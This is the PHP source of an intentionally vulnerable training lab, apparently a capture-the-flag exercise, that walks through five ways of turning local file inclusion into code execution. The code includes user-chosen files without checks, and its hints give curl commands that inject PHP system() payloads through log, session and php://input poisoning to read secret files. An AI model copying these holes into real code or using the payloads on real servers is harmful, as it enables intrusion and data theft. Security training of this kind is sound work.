<?php
// ============================================================
// LFI to RCE Chain Lab - Intentionally Vulnerable CTF
// WARNING: This is a security training lab. DO NOT deploy in production.
// ============================================================

$level = isset($_GET['level']) ? intval($_GET['level']) : 1;
if ($level < 1 || $level > 5) $level = 1;

// ============ TRACKING ============
function trackHit($labId) {
    @file_get_contents("http://tracking-service:8080/api/hit?" . http_build_query([
        'lab' => $labId,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? ''
    ]));
}
function trackFlag($labId, $flag) {
    @file_get_contents("http://tracking-service:8080/api/flag?" . http_build_query([
        'lab' => $labId,
        'flag' => $flag,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? ''
    ]));
}

// Track the lab hit
trackHit('lfi-rce');

// Level definitions
$levels = [
    1 => [
        'title' => 'Level 1 - /proc/self/environ',
        'difficulty' => 'Medium',
        'color' => '#f59e0b',
        'description' => 'Local File Inclusion can be used to read process environment variables. The flag is stored in an environment variable called <code>SECRET_FLAG</code>. Try to include <code>/proc/self/environ</code> to read it.',
        'hint' => 'Use ?file=/proc/self/environ to read the environment variables of the current process.',
    ],
    2 => [
        'title' => 'Level 2 - Log Poisoning via User-Agent',
        'difficulty' => 'Hard',
        'color' => '#f97316',
        'description' => 'Apache stores access logs at <code>/var/log/apache2/access.log</code>, including the User-Agent header. Inject PHP code into the User-Agent header of a request, then include the log file to execute it. Use the injected code to read <code>/var/secrets/flag2.txt</code>.',
        'hint' => 'Send a request with User-Agent containing PHP code using single quotes, then include /var/log/apache2/access.log. Example: curl -A "<?php system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(118).chr(97).chr(114).chr(47).chr(115).chr(101).chr(99).chr(114).chr(101).chr(116).chr(115).chr(47).chr(102).chr(108).chr(97).chr(103).chr(50).chr(46).chr(116).chr(120).chr(116)); ?>" http://TARGET:8047/?level=2',
    ],
    3 => [
        'title' => 'Level 3 - Session File Poisoning',
        'difficulty' => 'Hard',
        'color' => '#f97316',
        'description' => 'PHP sessions are stored as files on disk. This page stores your username in the session. Inject PHP code as your username, then include the session file to execute it. The session file is located at <code>/tmp/sessions/sess_&lt;session_id&gt;</code>. Read <code>/var/secrets/flag3.txt</code>.',
        'hint' => 'Set your username to <?php system("cat /var/secrets/flag3.txt"); ?> via the form below, then include /tmp/sessions/sess_<your_session_id>',
    ],
    4 => [
        'title' => 'Level 4 - /proc/self/fd/ Exploitation',
        'difficulty' => 'Expert',
        'color' => '#ef4444',
        'description' => 'Even if direct log file paths are unknown, you can access logs through <code>/proc/self/fd/</code>. File descriptors link to open files. First poison the Apache log via User-Agent, then iterate through <code>/proc/self/fd/N</code> to find one that links to the access log. Read <code>/var/secrets/flag4.txt</code>.',
        'hint' => 'Poison the log first with a crafted User-Agent, then try /proc/self/fd/2, /proc/self/fd/3, etc.',
    ],
    5 => [
        'title' => 'Level 5 - PHP Temp File / php://input',
        'difficulty' => 'Expert',
        'color' => '#ef4444',
        'description' => 'PHP supports <code>php://input</code> as an include target, which reads raw POST body data. Send a POST request with PHP code in the body while including <code>php://input</code> via the file parameter. Execute code to read <code>/var/secrets/flag5.txt</code>.',
        'hint' => 'Send a POST request to ?file=php://input with body: <?php system("cat /var/secrets/flag5.txt"); ?>',
    ],
];

$current = $levels[$level];

// Level-specific setup
if ($level == 1) {
    putenv('SECRET_FLAG=IDS{b53aaf8b92d6d11c66a4d0a1283fc1d8}');
}
// Clear log for level 2 and 4
if (($level == 2 || $level == 4) && !isset($_GET['file'])) {
    @file_put_contents('/var/log/apache2/access.log', '');
}

$session_id = '';
if ($level == 3) {
    session_start();
    $session_id = session_id();
    if (isset($_POST['username'])) {
        $_SESSION['username'] = $_POST['username'];
    }
}

// Handle file inclusion
$file = $_GET['file'] ?? '';
$output = '';
$flag_captured = false;
$captured_flag = '';

ob_start();
switch ($level) {
    case 1:
        // Level 1: /proc/self/environ - read env vars
        // /proc/self/environ may not be readable by www-data, so we also
        // check a pre-created copy at /var/www/environ/environ.txt
        $environ_path = '';
        if ($file) {
            // Try reading the requested file first
            $raw = @file_get_contents($file);
            if ($raw !== false) {
                $raw = str_replace("\0", "\n", $raw);
                echo htmlspecialchars($raw, ENT_SUBSTITUTE, 'UTF-8');
            } elseif (strpos($file, '/proc/self/environ') !== false) {
                // Fallback to the readable copy
                $raw = @file_get_contents('/var/www/environ/environ.txt');
                if ($raw !== false) {
                    $raw = str_replace("\0", "\n", $raw);
                    echo htmlspecialchars($raw, ENT_SUBSTITUTE, 'UTF-8');
                    echo "\n\n[Note: Reading from /var/www/environ/environ.txt (pre-dumped from /proc/1/environ)]";
                }
            }
        }
        break;
    case 2:
    case 3:
    case 4:
    case 5:
        if (strpos($file, 'php://input') === 0) {
            @include($file);
        } elseif ($file && @file_exists($file)) {
            @include($file);
        }
        break;
}
$output = ob_get_clean();

// Detect flags in output
if (preg_match('/IDS\{[^}]+\}/', $output, $m)) {
    $flag_captured = true;
    $captured_flag = $m[0];
    trackFlag('lfi-rce', $captured_flag);
}

// Detect flags from included files directly (for Level 1 environ)
if ($level == 1 && !$flag_captured) {
    $env_output = '';
    if ($file === '/proc/self/environ') {
        ob_start();
        @include('/proc/self/environ');
        $env_output = ob_get_clean();
        if (preg_match('/IDS\{[^}]+\}/', $env_output, $m)) {
            $flag_captured = true;
            $captured_flag = $m[0];
            trackFlag('lfi-rce', $captured_flag);
        }
    }
}

// Check if session data contains a flag for level 3
if ($level == 3 && !$flag_captured && isset($_SESSION['username'])) {
    if (preg_match('/IDS\{[^}]+\}/', $_SESSION['username'], $m)) {
        // Username itself contains a flag - not a real capture
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LFI to RCE Chain Lab</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0a0a1a;
            color: #e2e8f0;
            min-height: 100vh;
            line-height: 1.6;
        }

        .container {
            max-width: 960px;
            margin: 0 auto;
            padding: 2rem 1.5rem;
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 2.5rem;
            padding-bottom: 2rem;
            border-bottom: 1px solid #1e293b;
        }

        .header h1 {
            font-size: 2rem;
            font-weight: 700;
            color: #f1f5f9;
            margin-bottom: 0.5rem;
            letter-spacing: -0.5px;
        }

        .header h1 .icon { color: #ef4444; }

        .header .subtitle {
            font-size: 0.95rem;
            color: #64748b;
            font-weight: 400;
        }

        .header .warning {
            display: inline-block;
            margin-top: 1rem;
            padding: 0.4rem 1rem;
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 6px;
            font-size: 0.78rem;
            color: #fca5a5;
            font-weight: 500;
        }

        /* Level Navigation */
        .level-nav {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 2rem;
            flex-wrap: wrap;
        }

        .level-nav a {
            display: inline-flex;
            align-items: center;
            gap: 0.4rem;
            padding: 0.5rem 1rem;
            background: #111827;
            border: 1px solid #1e293b;
            border-radius: 8px;
            color: #94a3b8;
            text-decoration: none;
            font-size: 0.85rem;
            font-weight: 500;
            transition: all 0.2s;
        }

        .level-nav a:hover {
            background: #1e293b;
            color: #e2e8f0;
        }

        .level-nav a.active {
            border-color: <?php echo $current['color']; ?>;
            color: #f1f5f9;
            background: rgba(255,255,255,0.05);
        }

        .level-nav a .diff-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
        }

        /* Level Card */
        .level-card {
            background: #111827;
            border: 1px solid #1e293b;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 1.5rem;
        }

        .level-card-header {
            padding: 1.25rem 1.5rem;
            border-bottom: 1px solid #1e293b;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 0.75rem;
        }

        .level-card-header h2 {
            font-size: 1.15rem;
            font-weight: 600;
            color: #f1f5f9;
        }

        .badge {
            display: inline-block;
            padding: 0.2rem 0.75rem;
            border-radius: 9999px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .badge-medium { background: rgba(245,158,11,0.15); color: #fbbf24; border: 1px solid rgba(245,158,11,0.3); }
        .badge-hard { background: rgba(249,115,22,0.15); color: #fb923c; border: 1px solid rgba(249,115,22,0.3); }
        .badge-expert { background: rgba(239,68,68,0.15); color: #f87171; border: 1px solid rgba(239,68,68,0.3); }

        .level-card-body {
            padding: 1.5rem;
        }

        .level-card-body p {
            font-size: 0.9rem;
            color: #cbd5e1;
            margin-bottom: 1rem;
            line-height: 1.7;
        }

        .level-card-body code {
            font-family: 'JetBrains Mono', monospace;
            background: #1e293b;
            padding: 0.15rem 0.4rem;
            border-radius: 4px;
            font-size: 0.82rem;
            color: #a5f3fc;
        }

        /* Hint */
        .hint-box {
            background: rgba(99,102,241,0.08);
            border: 1px solid rgba(99,102,241,0.2);
            border-radius: 8px;
            padding: 1rem 1.25rem;
            margin-top: 1rem;
        }

        .hint-box summary {
            cursor: pointer;
            font-size: 0.85rem;
            font-weight: 600;
            color: #818cf8;
            user-select: none;
        }

        .hint-box .hint-content {
            margin-top: 0.75rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            color: #a5b4fc;
            line-height: 1.7;
            word-break: break-all;
        }

        /* File Inclusion Form */
        .include-section {
            background: #111827;
            border: 1px solid #1e293b;
            border-radius: 12px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
        }

        .include-section h3 {
            font-size: 1rem;
            font-weight: 600;
            color: #f1f5f9;
            margin-bottom: 1rem;
        }

        .include-form {
            display: flex;
            gap: 0.75rem;
            align-items: stretch;
        }

        .include-form label {
            font-size: 0.85rem;
            color: #64748b;
            font-weight: 500;
            white-space: nowrap;
            display: flex;
            align-items: center;
            font-family: 'JetBrains Mono', monospace;
        }

        .include-form input[type="text"] {
            flex: 1;
            padding: 0.6rem 1rem;
            background: #0a0a1a;
            border: 1px solid #334155;
            border-radius: 8px;
            color: #e2e8f0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            outline: none;
            transition: border-color 0.2s;
        }

        .include-form input[type="text"]:focus {
            border-color: #6366f1;
        }

        .include-form button {
            padding: 0.6rem 1.25rem;
            background: #6366f1;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 0.85rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            font-family: 'Inter', sans-serif;
        }

        .include-form button:hover {
            background: #4f46e5;
        }

        .include-url {
            margin-top: 0.75rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.78rem;
            color: #64748b;
            word-break: break-all;
        }

        .include-url span { color: #94a3b8; }

        /* Session info for Level 3 */
        .session-info {
            background: rgba(34,211,238,0.08);
            border: 1px solid rgba(34,211,238,0.2);
            border-radius: 8px;
            padding: 1rem 1.25rem;
            margin-bottom: 1.5rem;
        }

        .session-info h4 {
            font-size: 0.85rem;
            font-weight: 600;
            color: #22d3ee;
            margin-bottom: 0.5rem;
        }

        .session-info code {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            color: #67e8f9;
            background: rgba(34,211,238,0.1);
            padding: 0.15rem 0.4rem;
            border-radius: 4px;
        }

        .session-info .session-path {
            margin-top: 0.5rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            color: #a5f3fc;
        }

        /* Username form for Level 3 */
        .username-form {
            margin-bottom: 1.5rem;
        }

        .username-form h4 {
            font-size: 0.9rem;
            font-weight: 600;
            color: #f1f5f9;
            margin-bottom: 0.75rem;
        }

        .username-form .form-row {
            display: flex;
            gap: 0.75rem;
        }

        .username-form input[type="text"] {
            flex: 1;
            padding: 0.6rem 1rem;
            background: #0a0a1a;
            border: 1px solid #334155;
            border-radius: 8px;
            color: #e2e8f0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            outline: none;
        }

        .username-form input[type="text"]:focus {
            border-color: #22d3ee;
        }

        .username-form button {
            padding: 0.6rem 1.25rem;
            background: #0891b2;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 0.85rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            font-family: 'Inter', sans-serif;
        }

        .username-form button:hover {
            background: #0e7490;
        }

        .current-username {
            margin-top: 0.75rem;
            font-size: 0.82rem;
            color: #94a3b8;
        }

        .current-username code {
            font-family: 'JetBrains Mono', monospace;
            background: #1e293b;
            padding: 0.15rem 0.4rem;
            border-radius: 4px;
            color: #a5f3fc;
        }

        /* Output */
        .output-section {
            background: #111827;
            border: 1px solid #1e293b;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 1.5rem;
        }

        .output-header {
            padding: 0.75rem 1.25rem;
            background: #0f172a;
            border-bottom: 1px solid #1e293b;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .output-header .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
        }

        .output-header .dot-red { background: #ef4444; }
        .output-header .dot-yellow { background: #f59e0b; }
        .output-header .dot-green { background: #22c55e; }

        .output-header span {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.78rem;
            color: #64748b;
            margin-left: 0.25rem;
        }

        .output-body {
            padding: 1.25rem;
            max-height: 400px;
            overflow-y: auto;
        }

        .output-body pre {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            color: #94a3b8;
            white-space: pre-wrap;
            word-break: break-all;
            line-height: 1.7;
        }

        .output-body pre .highlight-flag {
            color: #4ade80;
            font-weight: 600;
        }

        .output-empty {
            color: #475569;
            font-style: italic;
            font-size: 0.85rem;
        }

        /* Flag captured */
        .flag-captured {
            background: rgba(34,197,94,0.08);
            border: 1px solid rgba(34,197,94,0.3);
            border-radius: 12px;
            padding: 1.5rem;
            text-align: center;
            margin-bottom: 1.5rem;
            animation: flagPulse 2s ease-in-out infinite;
        }

        @keyframes flagPulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(34,197,94,0.1); }
            50% { box-shadow: 0 0 20px 5px rgba(34,197,94,0.15); }
        }

        .flag-captured h3 {
            font-size: 1.1rem;
            font-weight: 600;
            color: #4ade80;
            margin-bottom: 0.75rem;
        }

        .flag-captured .flag-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1rem;
            color: #86efac;
            background: rgba(34,197,94,0.1);
            padding: 0.5rem 1.25rem;
            border-radius: 8px;
            display: inline-block;
        }

        /* Level Progress */
        .progress-bar {
            display: flex;
            gap: 0.25rem;
            margin-bottom: 2rem;
        }

        .progress-bar .step {
            flex: 1;
            height: 4px;
            border-radius: 2px;
            background: #1e293b;
            transition: background 0.3s;
        }

        .progress-bar .step.completed {
            background: #22c55e;
        }

        .progress-bar .step.current {
            background: <?php echo $current['color']; ?>;
        }

        /* Footer */
        .footer {
            text-align: center;
            padding-top: 2rem;
            border-top: 1px solid #1e293b;
            margin-top: 2rem;
        }

        .footer p {
            font-size: 0.8rem;
            color: #475569;
        }

        /* Curl examples */
        .curl-examples {
            background: #0f172a;
            border: 1px solid #1e293b;
            border-radius: 8px;
            padding: 1rem 1.25rem;
            margin-top: 1rem;
        }

        .curl-examples h4 {
            font-size: 0.82rem;
            font-weight: 600;
            color: #94a3b8;
            margin-bottom: 0.75rem;
        }

        .curl-examples pre {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            color: #64748b;
            line-height: 1.8;
            white-space: pre-wrap;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1><span class="icon">&lt;/&gt;</span> LFI to RCE Chain Lab</h1>
            <p class="subtitle">Local File Inclusion to Remote Code Execution - Full Exploitation Chain</p>
            <div class="warning">WARNING: Intentionally Vulnerable - For Security Training Only</div>
        </div>

        <!-- Progress Bar -->
        <div class="progress-bar">
            <?php for ($i = 1; $i <= 5; $i++): ?>
            <div class="step <?php echo $i < $level ? 'completed' : ($i == $level ? 'current' : ''); ?>"></div>
            <?php endfor; ?>
        </div>

        <!-- Level Navigation -->
        <div class="level-nav">
            <?php foreach ($levels as $num => $lv): ?>
            <a href="?level=<?php echo $num; ?>" class="<?php echo $num == $level ? 'active' : ''; ?>">
                <span class="diff-dot" style="background:<?php echo $lv['color']; ?>"></span>
                Level <?php echo $num; ?>
            </a>
            <?php endforeach; ?>
        </div>

        <!-- Level Card -->
        <div class="level-card">
            <div class="level-card-header">
                <h2><?php echo $current['title']; ?></h2>
                <?php
                $diff_class = 'badge-medium';
                if ($current['difficulty'] === 'Hard') $diff_class = 'badge-hard';
                if ($current['difficulty'] === 'Expert') $diff_class = 'badge-expert';
                ?>
                <span class="badge <?php echo $diff_class; ?>"><?php echo $current['difficulty']; ?></span>
            </div>
            <div class="level-card-body">
                <p><?php echo $current['description']; ?></p>

                <details class="hint-box">
                    <summary>Show Hint</summary>
                    <div class="hint-content"><?php echo htmlspecialchars($current['hint']); ?></div>
                </details>

                <?php if ($level === 1): ?>
                <div class="curl-examples">
                    <h4>Example Commands</h4>
<pre>curl "http://TARGET:8047/?level=1&file=/proc/self/environ"</pre>
                </div>
                <?php endif; ?>

                <?php if ($level === 2): ?>
                <div class="curl-examples">
                    <h4>Example Commands</h4>
<pre># Step 1: Poison the log with PHP code in User-Agent
curl -A '<?php system("cat /var/secrets/flag2.txt"); ?>' "http://TARGET:8047/?level=2"

# Step 2: Include the poisoned log
curl "http://TARGET:8047/?level=2&file=/var/log/apache2/access.log"</pre>
                </div>
                <?php endif; ?>

                <?php if ($level === 3): ?>
                <div class="curl-examples">
                    <h4>Example Commands</h4>
<pre># Step 1: Store PHP code as username (use your session cookie)
curl -c cookies.txt -X POST -d 'username=<?php system("cat /var/secrets/flag3.txt"); ?>' "http://TARGET:8047/?level=3"

# Step 2: Get your session ID from cookies.txt, then include session file
curl -b cookies.txt "http://TARGET:8047/?level=3&file=/tmp/sessions/sess_YOUR_SESSION_ID"</pre>
                </div>
                <?php endif; ?>

                <?php if ($level === 4): ?>
                <div class="curl-examples">
                    <h4>Example Commands</h4>
<pre># Step 1: Poison the log first
curl -A '<?php system("cat /var/secrets/flag4.txt"); ?>' "http://TARGET:8047/?level=4"

# Step 2: Try different file descriptors
curl "http://TARGET:8047/?level=4&file=/proc/self/fd/2"
curl "http://TARGET:8047/?level=4&file=/proc/self/fd/3"
curl "http://TARGET:8047/?level=4&file=/proc/self/fd/4"
# ... iterate through FDs</pre>
                </div>
                <?php endif; ?>

                <?php if ($level === 5): ?>
                <div class="curl-examples">
                    <h4>Example Commands</h4>
<pre># Use php://input with POST body containing PHP code
curl -X POST "http://TARGET:8047/?level=5&file=php://input" \
  -d '<?php system("cat /var/secrets/flag5.txt"); ?>'</pre>
                </div>
                <?php endif; ?>
            </div>
        </div>

        <?php if ($level === 3): ?>
        <!-- Session Info -->
        <div class="session-info">
            <h4>Session Information</h4>
            <p>Your Session ID: <code><?php echo htmlspecialchars($session_id); ?></code></p>
            <p class="session-path">Session file: <code>/tmp/sessions/sess_<?php echo htmlspecialchars($session_id); ?></code></p>
        </div>

        <!-- Username Form -->
        <div class="username-form">
            <h4>Set Username (stored in session)</h4>
            <form method="POST" class="form-row">
                <input type="text" name="username" placeholder="Enter username..." value="<?php echo isset($_SESSION['username']) ? htmlspecialchars($_SESSION['username']) : ''; ?>">
                <button type="submit">Save</button>
            </form>
            <?php if (isset($_SESSION['username'])): ?>
            <p class="current-username">Current username: <code><?php echo htmlspecialchars($_SESSION['username']); ?></code></p>
            <?php endif; ?>
        </div>
        <?php endif; ?>

        <!-- File Inclusion -->
        <div class="include-section">
            <h3>File Inclusion</h3>
            <form class="include-form" method="GET">
                <input type="hidden" name="level" value="<?php echo $level; ?>">
                <label for="file-input">?file=</label>
                <input type="text" id="file-input" name="file" value="<?php echo htmlspecialchars($file); ?>" placeholder="/path/to/file">
                <button type="submit">Include</button>
            </form>
            <?php if ($file): ?>
            <div class="include-url">
                Full URL: <span>/?level=<?php echo $level; ?>&file=<?php echo htmlspecialchars($file); ?></span>
            </div>
            <?php endif; ?>
        </div>

        <!-- Flag Captured -->
        <?php if ($flag_captured): ?>
        <div class="flag-captured">
            <h3>FLAG CAPTURED</h3>
            <div class="flag-value"><?php echo htmlspecialchars($captured_flag); ?></div>
        </div>
        <?php endif; ?>

        <!-- Output -->
        <?php if ($file): ?>
        <div class="output-section">
            <div class="output-header">
                <div class="dot dot-red"></div>
                <div class="dot dot-yellow"></div>
                <div class="dot dot-green"></div>
                <span>Included: <?php echo htmlspecialchars($file); ?></span>
            </div>
            <div class="output-body">
                <?php if ($output): ?>
                <pre><?php
                    if ($flag_captured) {
                        echo htmlspecialchars($output);
                    } else {
                        echo htmlspecialchars($output);
                    }
                ?></pre>
                <?php else: ?>
                <p class="output-empty">No output from inclusion. The file may not exist or produced no output.</p>
                <?php endif; ?>
            </div>
        </div>
        <?php endif; ?>

        <!-- Footer -->
        <div class="footer">
            <p>LFI to RCE Chain Lab &mdash; Security Training CTF &mdash; Level <?php echo $level; ?> / 5</p>
        </div>
    </div>
</body>
</html>